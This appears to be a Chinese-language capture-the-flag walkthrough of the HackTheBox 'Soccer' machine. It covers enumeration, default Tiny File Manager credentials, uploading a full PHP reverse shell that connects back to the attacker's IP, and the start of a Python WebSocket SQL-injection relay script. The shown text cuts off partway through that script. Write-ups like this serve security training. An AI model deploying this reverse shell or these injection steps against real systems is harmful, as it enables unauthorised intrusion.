<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTB-Soccer</title>
    <url>/posts/d0709a37.html</url>
    <content><![CDATA[<h1 id="HTB-Soccer"><a href="#HTB-Soccer" class="headerlink" title="HTB-Soccer"></a>HTB-Soccer</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.目录扫描发现子目录存在Tiny File Manager弱口令；</p>
<p>2.弱口令登录后文件上传反弹shell获取www-data权限；</p>
<p>3.ngnix配置文件信息泄露发现soc-player子域；</p>
<p>4.soc-player子域页面源码发现使用了WebSocket；</p>
<p>5.WebSocket实现SQL注入获取ssh账户；</p>
<p>6.doas和dstat联动提权</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>话不多说，nmap一把梭</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sC -sV 10.10.11.194<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/桌面]
└─# nmap -sC -sV 10.10.11.194
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-06 04:01 EST
Nmap scan report for 10.10.11.194
Host is up (0.26s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
......
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
......
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.39 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放端口：22（SSH）、80（HTTP，ngnix服务器）、9091</p>
<p>80端口HTTP服务域名为soccer.htb，将域名解析条目添加到hosts文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.194 soccer.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器访问soccer.htb，常规思路观察页面、看源码，没东西</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230207100753493.png"></p>
<p>gobuster扫目录（PS：龟速dirb还是少用）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/桌面]
└─# gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/06 07:27:43 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
Progress: 13324 / 20470 (65.09%)[ERROR] 2023/02/06 07:35:14 [!] Get "http://soccer.htb/our-blog": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 13333 / 20470 (65.13%)[ERROR] 2023/02/06 07:35:15 [!] Get "http://soccer.htb/out": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 13408 / 20470 (65.50%)[ERROR] 2023/02/06 07:35:21 [!] Get "http://soccer.htb/p7ap": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14609 / 20470 (71.37%)[ERROR] 2023/02/06 07:36:13 [!] Get "http://soccer.htb/producttags": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14614 / 20470 (71.39%)[ERROR] 2023/02/06 07:36:14 [!] Get "http://soccer.htb/profiles": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14625 / 20470 (71.45%)[ERROR] 2023/02/06 07:36:17 [!] Get "http://soccer.htb/promoted": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14652 / 20470 (71.58%)[ERROR] 2023/02/06 07:36:21 [!] Get "http://soccer.htb/proplayer": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 14707 / 20470 (71.85%)[ERROR] 2023/02/06 07:36:25 [!] Get "http://soccer.htb/prototype": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/tiny                 (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/]
Progress: 20469 / 20470 (100.00%)
===============================================================
2023/02/06 07:40:00 Finished
===============================================================<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>扫得<code>http://soccer.htb/tiny/</code>，浏览器访问，是个登录界面</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213093156511.png" style="zoom:67%;">

<p>下方有个超链接：<a href="https://tinyfilemanager.github.io/">—— © CCP Programmers ——</a>，打开一看，就是登录页面的标题。</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213095237007.png" style="zoom:67%;">

<h2 id="三、Tiny-File-Manager弱口令"><a href="#三、Tiny-File-Manager弱口令" class="headerlink" title="三、Tiny File Manager弱口令"></a>三、Tiny File Manager弱口令</h2><p>Github有默认用户名和密码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">默认用户名/密码:
admin/admin@123
user/12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="四、文件上传反弹shell"><a href="#四、文件上传反弹shell" class="headerlink" title="四、文件上传反弹shell"></a>四、文件上传反弹shell</h2><p>用admin用户登录进来，浏览页面，有个上传点，那当然是试试能不能上传个反弹shell。试来试去，发现刚进来的主界面是/var/www/html目录，正常的www服务目录，上传的话只会上传到当前所在目录，而且只有tiny/uploads目录下可以上传成功。由于靶场环境会隔几分钟刷新，所以上传的文件留存不了太久，建议上传之前就开好监听</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 3030	#端口改成自己脚本对应的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213095809172.png"></p>
<p>反弹shell脚本如下，注意修改ip为自己的vpn环境的ip（ifconfig命令看tun0网卡ip）</p>
<p>参考<a href="https://github.com/Cyberw1ng/Bug-Bounty/blob/main/rev_shell.php">https://github.com/Cyberw1ng/Bug-Bounty/blob/main/rev_shell.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'10.10.16.6'</span><span class="token punctuation">;</span>  <span class="token comment">// CHANGE THIS</span>
<span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">3030</span><span class="token punctuation">;</span>       <span class="token comment">// CHANGE THIS</span>
<span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span>
<span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span>
<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
   <span class="token number">0</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
   <span class="token number">1</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
   <span class="token number">2</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successfully opened reverse shell to <span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell connection terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell process terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token variable">$read_a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$num_changed_sockets</span> <span class="token operator">=</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token variable">$read_a</span><span class="token punctuation">,</span> <span class="token variable">$write_a</span><span class="token punctuation">,</span> <span class="token variable">$error_a</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上传成功</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213110535059.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213110432889.png"></p>
<p>URL栏里访问Shell文件<code>https://www.soccer.htb/tiny/uploads/ReverseShell.php</code></p>
<p>监听接收到shell响应</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213114248912.png"></p>
<p>获取bash，也就是转换成交互式shell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213124920500.png"></p>
<p>此时我们先看home目录，看有哪些用户，然后发现/home/player目录下有个user.txt，但www-data用户无访问权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213125411132.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213125607328.png"></p>
<h2 id="五、ngnix配置文件敏感信息泄露"><a href="#五、ngnix配置文件敏感信息泄露" class="headerlink" title="五、ngnix配置文件敏感信息泄露"></a>五、ngnix配置文件敏感信息泄露</h2><p>然后来看ngnix的配置文件，在/etc/nginx/sites-enabled发现子域名soc-player.soccer.htb，这子域名也可以在/etc/hosts发现</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213153122893.png"></p>
<p>再次添加域名解析条目进hosts文件，然后浏览器访问，如下可看到【Match】、【Login】、【Signup】字段</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.194 soc-player.soccer.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213154250556.png"></p>
<p>Match页面没什么东西</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230214192851159.png"></p>
<p>那我们就试试【Singnup】注册个账户，注册成功</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213155344945.png"></p>
<p>然后登录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213155603099.png"></p>
<p>登录成功，跳转到一个票据检查页面</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213155822282.png"></p>
<p>查看源码，用了WebSocket</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213160129163.png"></p>
<h2 id="六、WebSocket实现SQL注入"><a href="#六、WebSocket实现SQL注入" class="headerlink" title="六、WebSocket实现SQL注入"></a>六、WebSocket实现SQL注入</h2><p>这里搜寻了大佬的思路，参考：<a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">Automating Blind SQL injection over WebSocket</a>，可以利用WebSocket，实施SQL注入。在任意位置新建以下脚本文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> SimpleHTTPRequestHandler
<span class="token keyword">from</span> socketserver <span class="token keyword">import</span> TCPServer
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token punctuation">,</span> urlparse
<span class="token keyword">from</span> websocket <span class="token keyword">import</span> create_connection

ws_server <span class="token operator">=</span> <span class="token string">"ws://soc-player.soccer.htb:9091/"</span>

<span class="token keyword">def</span> <span class="token function">send_ws</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
 ws <span class="token operator">=</span> create_connection<span class="token punctuation">(</span>ws_server<span class="token punctuation">)</span>
 <span class="token comment"># If the server returns a response on connect, use below line </span>
 <span class="token comment">#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here</span>
 
 <span class="token comment"># For our case, format the payload in JSON</span>
 message <span class="token operator">=</span> unquote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">)</span> <span class="token comment"># replacing " with ' to avoid breaking JSON structure</span>
 data <span class="token operator">=</span> <span class="token string">'{"id":"%s"}'</span> <span class="token operator">%</span> message

 ws<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
 resp <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 ws<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

 <span class="token keyword">if</span> resp<span class="token punctuation">:</span>
  <span class="token keyword">return</span> resp
 <span class="token keyword">else</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">middleware_server</span><span class="token punctuation">(</span>host_port<span class="token punctuation">,</span>content_type<span class="token operator">=</span><span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

 <span class="token keyword">class</span> <span class="token class-name">CustomHandler</span><span class="token punctuation">(</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
   self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
   <span class="token keyword">try</span><span class="token punctuation">:</span>
